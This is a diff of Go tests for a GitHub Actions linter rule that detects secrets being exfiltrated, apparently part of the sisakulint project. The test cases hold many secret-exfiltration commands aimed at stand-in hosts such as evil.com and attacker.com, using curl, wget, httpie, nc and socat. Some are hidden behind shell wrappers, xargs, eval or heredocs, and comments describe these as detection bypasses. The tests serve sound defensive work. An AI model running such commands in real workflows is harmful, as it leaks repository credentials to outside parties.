@@ -5,6 +5,7 @@ import (
 	"testing"
 
 	"github.com/sisaku-security/sisakulint/pkg/ast"
+	"github.com/sisaku-security/sisakulint/pkg/shell"
 )
 
 func TestNewSecretExfiltrationRule(t *testing.T) {
@@ -15,6 +16,22 @@ func TestNewSecretExfiltrationRule(t *testing.T) {
 	if !strings.Contains(rule.RuleDesc, "exfiltrated") {
 		t.Errorf("RuleDesc should contain 'exfiltrated', got %q", rule.RuleDesc)
 	}
+}
+
+func runSecretExfiltrationRuleForTest(script string, envVars map[string]*ast.EnvVar) []*LintingError {
+	rule := NewSecretExfiltrationRule()
+	step := &ast.Step{
+		Env: &ast.Env{Vars: envVars},
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: script,
+				Pos:   &ast.Position{Line: 1, Col: 1},
+			},
+		},
+	}
+	job := &ast.Job{Steps: []*ast.Step{step}}
+	_ = rule.VisitJobPre(job)
+	return rule.Errors()
 }
 
 func TestSecretExfiltration_CurlWithSecret(t *testing.T) {
@@ -41,6 +58,18 @@ func TestSecretExfiltration_CurlWithSecret(t *testing.T) {
 			runScript:   `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
 			wantErrors:  1,
 			description: "Should detect curl with secret in header",
+		},
+		{
+			name:        "curl with attached -H value containing secret",
+			runScript:   `curl -H"Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com`,
+			wantErrors:  1,
+			description: "Should detect curl with secret in attached -H header value",
+		},
+		{
+			name:        "curl with attached -d value containing secret",
+			runScript:   `curl -d"token=${{ secrets.TOKEN }}" https://evil.com`,
+			wantErrors:  1,
+			description: "Should detect curl with secret in attached -d data value",
 		},
 		{
 			name:        "curl POST to github api (legitimate)",
@@ -75,14 +104,14 @@ curl -X POST https://attacker.com/exfil -d "secret=${{ secrets.API_KEY }}"`,
 			description: "Should NOT flag GITHUB_TOKEN used with GitHub API across line continuation",
 		},
 		{
-			name: "curl with secret as URL positional arg (legitimate webhook)",
-			runScript: `RESPONSE=$(curl -s -w "%{http_code}" -H "Content-Type: application/json" -X POST -d "$DISCORD_PAYLOAD" ${{ secrets.DISCORD_WEBHOOK_URL }})`,
+			name:        "curl with secret as URL positional arg (legitimate webhook)",
+			runScript:   `RESPONSE=$(curl -s -w "%{http_code}" -H "Content-Type: application/json" -X POST -d "$DISCORD_PAYLOAD" ${{ secrets.DISCORD_WEBHOOK_URL }})`,
 			wantErrors:  0,
 			description: "Should NOT flag secret used as URL positional argument (not as flag value)",
 		},
 		{
-			name: "curl with secret in header to attacker (malicious)",
-			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
+			name:        "curl with secret in header to attacker (malicious)",
+			runScript:   `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
 			wantErrors:  1,
 			description: "Should detect curl with secret in auth header to external site",
 		},
@@ -94,8 +123,20 @@ result=$(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" "$api_url/re
 			description: "Should NOT flag curl when URL variable resolves to api.github.com",
 		},
 		{
-			name: "curl with secret to uploads.github.com (legitimate)",
-			runScript: `curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" --data-binary @file.zip "https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"`,
+			name:        "curl with secret directly to github api via bare host (legitimate)",
+			runScript:   `curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" api.github.com/repos/owner/repo/releases/latest`,
+			wantErrors:  0,
+			description: "Should NOT flag curl when bare host destination is api.github.com",
+		},
+		{
+			name:        "curl with secret to github api via inline url flag (legitimate)",
+			runScript:   `curl --url=https://api.github.com/repos/owner/repo/releases/latest -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}"`,
+			wantErrors:  0,
+			description: "Should NOT flag curl when inline --url destination is api.github.com",
+		},
+		{
+			name:        "curl with secret to uploads.github.com (legitimate)",
+			runScript:   `curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" --data-binary @file.zip "https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"`,
 			wantErrors:  0,
 			description: "Should NOT flag curl upload to uploads.github.com",
 		},
@@ -369,7 +410,7 @@ func TestSecretExfiltration_EnvVarLeak(t *testing.T) {
 					},
 				},
 			},
-			runScript:   `RESPONSE=$(curl -sS -w "\nHTTP %{http_code}" -X POST "$GOOGLE_CHAT_WEBHOOK"`,
+			runScript:   `RESPONSE=$(curl -sS -w "\nHTTP %{http_code}" -X POST "$GOOGLE_CHAT_WEBHOOK")`,
 			wantErrors:  0,
 			description: "Should NOT detect webhook URL used as curl POST destination (not data payload)",
 		},
@@ -821,6 +862,386 @@ func TestSecretExfiltration_CurlToKnownGoodDomains(t *testing.T) {
 	}
 }
 
+func TestSecretExfiltration_AllowlistRequiresDestinationHostBoundary(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "allowlisted host in header does not suppress malicious destination",
+			runScript: `curl -H "Referer: https://api.github.com" -d "token=${{ secrets.TOKEN }}" https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "allowlisted host suffix is not allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com.evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "untrusted second destination prevents allowlist suppression",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "artifactory in untrusted path does not allowlist",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com/artifactory`,
+			wantErrs:  1,
+		},
+		{
+			name:      "hashicorp in untrusted path does not allowlist",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com/hashicorp`,
+			wantErrs:  1,
+		},
+		{
+			name:      "artifactory product host is not implicitly allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://artifactory.example.com/api`,
+			wantErrs:  1,
+		},
+		{
+			name:      "artifactory attacker-controlled host is not allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://artifactory.evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "nexus in attacker-controlled host is not allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil-nexus.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "vault attacker-controlled host is not allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://vault.evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "explicit hashicorp domain remains allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://releases.hashicorp.com/vault/`,
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_CriticalRegressions covers the four bypass classes
+// identified in the PR #464 review: path-prefix allowlist boundary,
+// shell-wrapper re-parsing (bash -c / sh -c / eval), xargs/parallel wrappers,
+// and the parse-failure fallback warning.
+func TestSecretExfiltration_CriticalRegressions(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		// C1 — path boundary: pattern "slack.com/api" must not allowlist "/api2/evil".
+		{
+			name:      "C1 path-prefix bypass: slack.com/api2/evil is not allowlisted",
+			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api2/evil`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C1 path boundary: dash-suffixed sibling path is not allowlisted",
+			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api-attacker/foo`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C1 exact path remains allowlisted",
+			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api`,
+			wantErrs:  0,
+		},
+		{
+			name:      "C1 trailing slash on real path remains allowlisted",
+			runScript: `curl -d "token=${{ secrets.SLACK_TOKEN }}" https://slack.com/api/v1/chat.postMessage`,
+			wantErrs:  0,
+		},
+
+		// C2 — shell wrapper re-parsing.
+		{
+			name:      "C2 bash -c wrapping curl is detected",
+			runScript: `bash -c 'curl -d "${{ secrets.TOKEN }}" https://evil.com'`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C2 sh -c wrapping curl is detected",
+			runScript: `sh -c "curl -d '${{ secrets.TOKEN }}' https://evil.com"`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C2 eval wrapping curl is detected",
+			runScript: `eval "curl -d '${{ secrets.TOKEN }}' https://evil.com"`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C2 bash -c with allowlisted destination is not flagged",
+			runScript: `bash -c 'curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com/repos'`,
+			wantErrs:  0,
+		},
+
+		// C3 — xargs / parallel wrappers.
+		{
+			name:      "C3 xargs invoking curl is detected",
+			runScript: `echo https://evil.com | xargs curl -d "${{ secrets.TOKEN }}"`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C3 xargs with -I joined replacement is detected",
+			runScript: `echo evil.com | xargs -I{} curl -d "${{ secrets.TOKEN }}" https://{}`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C3 xargs with -I separated replacement is detected",
+			runScript: `echo evil.com | xargs -I {} curl -d "${{ secrets.TOKEN }}" https://{}`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C3 parallel invoking curl is detected",
+			runScript: `parallel curl -d "${{ secrets.TOKEN }}" https://evil.com ::: a b`,
+			wantErrs:  1,
+		},
+		{
+			name:      "C3 parallel with -j flag is detected",
+			runScript: `parallel -j 4 curl -d "${{ secrets.TOKEN }}" https://evil.com ::: a b`,
+			wantErrs:  1,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_ParseFailureFallback ensures the rule emits a
+// conservative warning rather than silently dropping detection when the shell
+// AST parser cannot analyze a run script that contains both a network keyword
+// and a secret reference (C4 fix).
+func TestSecretExfiltration_ParseFailureFallback(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "unmatched command substitution with curl + secret triggers fallback",
+			runScript: `curl -d "${{ secrets.TOKEN }}" https://evil.com $(`,
+			wantErrs:  1,
+		},
+		{
+			name:      "unmatched paren in echo without network keyword does not warn",
+			runScript: `echo "${{ secrets.TOKEN }}" $(`,
+			wantErrs:  0,
+		},
+		{
+			name:      "malformed script without secret reference does not warn",
+			runScript: `curl https://example.com $(`,
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_EnvWrapperOperandConsumption verifies that env(1)
+// options taking an operand (-u/--unset NAME, -C/--chdir DIR,
+// -S/--split-string STR) consume that operand so the wrapped network command
+// is still recognized. Without operand consumption, e.g.
+// `env -u OLD_TOKEN curl ...` mis-classifies OLD_TOKEN as the wrapped command
+// and silently drops the curl call.
+func TestSecretExfiltration_EnvWrapperOperandConsumption(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "env -u short option consumes operand",
+			runScript: `env -u OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env -C short option consumes operand",
+			runScript: `env -C /tmp curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env -S short option consumes operand",
+			runScript: `env -S "FOO=bar" curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env --unset long option consumes operand",
+			runScript: `env --unset OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env --chdir long option consumes operand",
+			runScript: `env --chdir /tmp curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env --unset=NAME inline form does not consume next arg",
+			runScript: `env --unset=OLD_TOKEN curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "env -i no-operand option still works",
+			runScript: `env -i curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrs:  1,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_WrapperInnerAssignment verifies that bash -c / sh -c
+// / eval re-parsing resolves shell assignments inside the wrapped script.
+// The inner script's `TOKEN=${{ secrets.X }}; curl -d "$TOKEN"` form is the
+// natural shell-one-liner shape an attacker would use; outer-script-only
+// resolution leaves it as a silent FN.
+func TestSecretExfiltration_WrapperInnerAssignment(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "bash -c with inner assignment is detected",
+			runScript: `bash -c 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
+			wantErrs:  1,
+		},
+		{
+			name:      "sh -c with inner assignment is detected",
+			runScript: `sh -c 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
+			wantErrs:  1,
+		},
+		{
+			name:      "eval with inner assignment is detected",
+			runScript: `eval 'TOKEN=${{ secrets.TOKEN }}; curl -d "$TOKEN" https://evil.com'`,
+			wantErrs:  1,
+		},
+		{
+			name:      "bash -c with allowlisted destination plus inner assignment is suppressed",
+			runScript: `bash -c 'TOKEN=${{ secrets.GITHUB_TOKEN }}; curl -H "Authorization: Bearer $TOKEN" https://api.github.com/repos'`,
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_HeredocCmdSubstWalk verifies that command
+// substitutions inside unquoted heredoc bodies and here-string words are
+// walked. walkForNetworkCommands previously treated *syntax.Redirect as a
+// no-op alongside SglQuoted / ParamExp / Lit, which silently dropped
+// `cat <<EOF\n$(curl ...)\nEOF` and `cat <<< $(curl ...)`. Quoted heredocs
+// (`<<'EOF'`) emit only a Lit part and remain FP-safe.
+func TestSecretExfiltration_HeredocCmdSubstWalk(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "unquoted heredoc body with CmdSubst curl is detected",
+			runScript: "cat <<EOF\n$(curl -d \"${{ secrets.TOKEN }}\" https://evil.com)\nEOF",
+			wantErrs:  1,
+		},
+		{
+			name:      "unquoted here-string with CmdSubst curl is detected",
+			runScript: `cat <<< $(curl -d "${{ secrets.TOKEN }}" https://evil.com)`,
+			wantErrs:  1,
+		},
+		{
+			name:      "quoted heredoc body with CmdSubst-shaped literal is not detected",
+			runScript: "cat <<'EOF'\n$(curl -d \"${{ secrets.TOKEN }}\" https://evil.com)\nEOF",
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
+// TestSecretExfiltration_HeredocOnPipeProducer verifies that producer-side
+// heredoc / here-string bodies on the upstream of a pipe flow into PipeInputs.
+// The collectPipeInputArgsInto walker previously dropped *syntax.Redirect
+// nodes silently, so `cat <<EOF | nc attacker 443` lost the heredoc body.
+func TestSecretExfiltration_HeredocOnPipeProducer(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "heredoc on producer piped to nc is detected",
+			runScript: "cat <<'EOF' | nc attacker.com 443\n${{ secrets.TOKEN }}\nEOF",
+			wantErrs:  1,
+		},
+		{
+			name:      "here-string on producer piped to nc is detected",
+			runScript: `cat <<< '${{ secrets.TOKEN }}' | nc attacker.com 443`,
+			wantErrs:  1,
+		},
+		{
+			name:      "heredoc on producer piped to curl --data-binary @- is detected",
+			runScript: "cat <<'EOF' | curl --data-binary @- https://evil.com\n${{ secrets.TOKEN }}\nEOF",
+			wantErrs:  1,
+		},
+		{
+			name:      "non-stdin redirect (fd 2) heredoc is not collected",
+			runScript: "cat 2<<'EOF' | nc attacker.com 443\n${{ secrets.TOKEN }}\nEOF",
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
 func TestSecretExfiltration_EdgeCases(t *testing.T) {
 	tests := []struct {
 		name        string
@@ -847,10 +1268,10 @@ func TestSecretExfiltration_EdgeCases(t *testing.T) {
 			description: "Should NOT detect curl as variable value",
 		},
 		{
-			name:        "secret in echo but not in curl - false positive accepted",
+			name:        "secret in echo but not in curl",
 			runScript:   `echo "${{ secrets.TOKEN }}" && curl https://example.com`,
-			wantErrors:  1,
-			description: "False positive: secret and curl on same line but secret not passed to curl (limitation of line-based analysis)",
+			wantErrors:  0,
+			description: "Should NOT detect a secret used by echo when the curl command receives no secret",
 		},
 	}
 
@@ -879,6 +1300,206 @@ func TestSecretExfiltration_EdgeCases(t *testing.T) {
 	}
 }
 
+func TestSecretExfiltration_PositionAfterEarlierGitHubExpression(t *testing.T) {
+	runScript := `echo '${{ github.repository }}' && curl -d 'token=${{ secrets.API_TOKEN }}' https://evil.com`
+
+	errors := runSecretExfiltrationRuleForTest(runScript, nil)
+	if len(errors) != 1 {
+		t.Fatalf("got %d errors, want 1. Errors: %v", len(errors), errors)
+	}
+
+	curlCol := strings.Index(runScript, "curl") + 1
+	if errors[0].LineNumber != 1 {
+		t.Fatalf("LineNumber = %d, want 1. Error: %v", errors[0].LineNumber, errors[0])
+	}
+	if errors[0].ColNumber < curlCol {
+		t.Fatalf("ColNumber = %d, want at or after curl column %d. Error: %v", errors[0].ColNumber, curlCol, errors[0])
+	}
+}
+
+func TestSecretExfiltration_ASTNetworkCommandSemantics(t *testing.T) {
+	tests := []struct {
+		name         string
+		runScript    string
+		envVars      map[string]*ast.EnvVar
+		wantErrors   int
+		wantCommand  string
+		wantSeverity string
+	}{
+		{
+			name:       "quoted string containing curl is not a command",
+			runScript:  `echo 'curl -d "${{ secrets.TOKEN }}" https://evil.com'`,
+			wantErrors: 0,
+		},
+		{
+			name: "heredoc body containing curl is not a command",
+			runScript: `cat <<'EOF'
+curl -d "${{ secrets.TOKEN }}" https://evil.com
+EOF`,
+			wantErrors: 0,
+		},
+		{
+			name: "line continuation keeps curl data flag and secret in one AST call",
+			runScript: `curl -X POST https://attacker.com \
+  -d "token=${{ secrets.API_TOKEN }}"`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:       "secret echoed before curl is not passed to curl",
+			runScript:  `echo "${{ secrets.TOKEN }}" && curl https://example.com`,
+			wantErrors: 0,
+		},
+		{
+			name: "piped secret into curl stdin data is detected",
+			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
+  curl --data-binary @- https://evil.com`,
+			wantErrors:   1,
+			wantCommand:  "curl",
+			wantSeverity: "critical",
+		},
+		{
+			name:         "here-string secret into curl stdin data is detected",
+			runScript:    `curl --data-binary @- https://evil.com <<< '${{ secrets.TOKEN }}'`,
+			wantErrors:   1,
+			wantCommand:  "curl",
+			wantSeverity: "critical",
+		},
+		{
+			name:         "here-string secret into wget stdin post file is detected",
+			runScript:    `wget --post-file=- https://evil.com <<< '${{ secrets.TOKEN }}'`,
+			wantErrors:   1,
+			wantCommand:  "wget",
+			wantSeverity: "critical",
+		},
+		{
+			name:        "httpie http command with secret is detected",
+			runScript:   `http POST https://evil.com token='${{ secrets.TOKEN }}'`,
+			wantErrors:  1,
+			wantCommand: "http",
+		},
+		{
+			name:        "httpie https command with secret is detected",
+			runScript:   `https POST evil.com token='${{ secrets.TOKEN }}'`,
+			wantErrors:  1,
+			wantCommand: "https",
+		},
+		{
+			name: "piped secret into nc is detected",
+			runScript: `printf "%s" '${{ secrets.TOKEN }}' |
+  nc attacker.com 443`,
+			wantErrors:  1,
+			wantCommand: "nc",
+		},
+		{
+			name: "piped secret env var into socat is detected",
+			envVars: map[string]*ast.EnvVar{
+				"SECRET_TOKEN": {
+					Name:  &ast.String{Value: "SECRET_TOKEN"},
+					Value: &ast.String{Value: "${{ secrets.SECRET_TOKEN }}"},
+				},
+			},
+			runScript: `printf "%s" "$SECRET_TOKEN" |
+  socat - TCP:attacker.com:443`,
+			wantErrors:  1,
+			wantCommand: "socat",
+		},
+		{
+			name:       "secret in git push argument is ignored because git is not a network sink",
+			runScript:  `git push origin "${{ secrets.TOKEN }}"`,
+			wantErrors: 0,
+		},
+		{
+			name:        "sudo wrapped curl with secret is detected",
+			runScript:   `sudo curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:       "sudo user argument named curl is not treated as network command",
+			runScript:  `sudo -u curl echo -d '${{ secrets.TOKEN }}'`,
+			wantErrors: 0,
+		},
+		{
+			name:        "command wrapped curl with secret is detected",
+			runScript:   `command curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:        "env wrapped curl with secret is detected",
+			runScript:   `env FOO=bar curl -d 'token=${{ secrets.TOKEN }}' https://evil.com`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:       "env wrapped curl with inline secret assignment is not shell-expanded",
+			runScript:  `env TOKEN='${{ secrets.TOKEN }}' curl -d "$TOKEN" https://evil.com`,
+			wantErrors: 0,
+		},
+		{
+			name:       "command-scoped shell assignment before curl is not shell-expanded",
+			runScript:  `TOKEN='${{ secrets.TOKEN }}' curl -d "$TOKEN" https://evil.com`,
+			wantErrors: 0,
+		},
+		{
+			name:        "previous shell assignment before curl is detected",
+			runScript:   `TOKEN='${{ secrets.TOKEN }}'; curl -d "$TOKEN" https://evil.com`,
+			wantErrors:  1,
+			wantCommand: "curl",
+		},
+		{
+			name:       "env assignment before unrelated command is not visible to later curl",
+			runScript:  `env TOKEN='${{ secrets.TOKEN }}' true; curl -d "$TOKEN" https://evil.com`,
+			wantErrors: 0,
+		},
+		{
+			name:        "here-string secret into nc is detected",
+			runScript:   `nc attacker.com 443 <<< '${{ secrets.TOKEN }}'`,
+			wantErrors:  1,
+			wantCommand: "nc",
+		},
+		{
+			name:       "here-string to non-stdin fd is ignored",
+			runScript:  `nc attacker.com 443 3<<< '${{ secrets.TOKEN }}'`,
+			wantErrors: 0,
+		},
+		{
+			name: "heredoc secret into nc is detected",
+			runScript: `nc attacker.com 443 <<'EOF'
+${{ secrets.TOKEN }}
+EOF`,
+			wantErrors:  1,
+			wantCommand: "nc",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, tt.envVars)
+			if len(errors) != tt.wantErrors {
+				t.Fatalf("got %d errors, want %d. Errors: %v", len(errors), tt.wantErrors, errors)
+			}
+
+			if tt.wantCommand == "" {
+				return
+			}
+
+			wantDescription := "network command '" + tt.wantCommand + "'"
+			for _, err := range errors {
+				if strings.Contains(err.Description, wantDescription) &&
+					(tt.wantSeverity == "" || strings.Contains(err.Description, "("+tt.wantSeverity+")")) {
+					return
+				}
+			}
+			if tt.wantSeverity != "" {
+				t.Fatalf("expected at least one error description to contain %q and severity %q. Errors: %v", wantDescription, tt.wantSeverity, errors)
+			}
+			t.Fatalf("expected at least one error description to contain %q. Errors: %v", wantDescription, errors)
+		})
+	}
+}
+
 func TestSecretExfiltration_ExtractSecretRef(t *testing.T) {
 	rule := NewSecretExfiltrationRule()
 
@@ -902,30 +1523,33 @@ func TestSecretExfiltration_ExtractSecretRef(t *testing.T) {
 	}
 }
 
-func TestSecretExfiltration_LineContainsCommand(t *testing.T) {
+func TestSecretExfiltration_ASTArgSinkClassification(t *testing.T) {
 	rule := NewSecretExfiltrationRule()
-
-	tests := []struct {
-		line     string
-		cmd      string
-		expected bool
-	}{
-		{"curl https://example.com", "curl", true},
-		{"  curl https://example.com", "curl", true},
-		{"$(curl https://example.com)", "curl", true},
-		{"`curl https://example.com`", "curl", true},
-		{"echo test && curl https://example.com", "curl", true},
-		{"echo test; curl https://example.com", "curl", true},
-		{"CURL=value", "curl", false},
-		{"mycurl https://example.com", "curl", false},
-		{"echo curl", "curl", true}, // This is a false positive but acceptable
+	curl, ok := networkCommandByName("curl")
+	if !ok {
+		t.Fatalf("curl command config not found")
 	}
 
-	for _, tt := range tests {
-		got := rule.lineContainsCommand(tt.line, tt.cmd)
-		if got != tt.expected {
-			t.Errorf("lineContainsCommand(%q, %q) = %v, want %v", tt.line, tt.cmd, got, tt.expected)
-		}
+	call := shell.NetworkCommandCall{
+		CommandName: "curl",
+		Args: []shell.CommandArg{
+			{Value: "-H", LiteralValue: "-H", IsFlag: true},
+			{Value: "Content-Type: application/json", LiteralValue: "Content-Type: application/json"},
+			{Value: "https://example.com/webhook", LiteralValue: "https://example.com/webhook"},
+			{Value: "-d", LiteralValue: "-d", IsFlag: true},
+			{Value: `{"token":"${{ secrets.TOKEN }}"}`, LiteralValue: `{"token":"${{ secrets.TOKEN }}"}`},
+			{Value: "https://collector.example/upload", LiteralValue: "https://collector.example/upload"},
+		},
+	}
+
+	if rule.isDataSinkArg(call, 2, curl) {
+		t.Errorf("metadata header value should not make following URL positional arg a data sink")
+	}
+	if !rule.isDataSinkArg(call, 4, curl) {
+		t.Errorf("-d payload value should be a data sink")
+	}
+	if rule.isDataSinkArg(call, 5, curl) {
+		t.Errorf("URL positional arg should not be a data sink")
 	}
 }
 
@@ -986,6 +1610,21 @@ curl -X POST -H "Authorization: token $GITHUB_TOKEN" --data-binary @file "$uploa
 			wantErrors: 1,
 			desc:       "Should flag curl sending env-var secret to non-legit destination",
 		},
+		{
+			name: "later safe assignment does not allowlist earlier malicious call",
+			runScript: `api_url="https://evil.com/exfil"
+curl -H "Authorization: token $GITHUB_TOKEN" "$api_url"
+api_url="https://api.github.com/repos/owner/repo"`,
+			wantErrors: 1,
+			desc:       "Should flag when URL variable was malicious at call time even if reassigned later",
+		},
+		{
+			name: "env assignment does not allowlist shell-expanded destination variable",
+			runScript: `api_url="https://evil.com/exfil"
+env api_url=https://api.github.com curl -H "Authorization: token $GITHUB_TOKEN" "$api_url"`,
+			wantErrors: 1,
+			desc:       "Should flag because $api_url expands before env can override it",
+		},
 	}
 
 	for _, tt := range tests {
@@ -1041,6 +1680,12 @@ func TestResolveVarInScript(t *testing.T) {
 api_url="https://evil.com/exfil"`,
 			varName: "api_url",
 			want:    "https://evil.com/exfil",
+		},
+		{
+			name:    "command-scoped assignment is not shell-visible",
+			script:  `TOKEN="secret-value" curl -d "$TOKEN" https://evil.com`,
+			varName: "TOKEN",
+			want:    "",
 		},
 		{
 			name: "indented assignment",
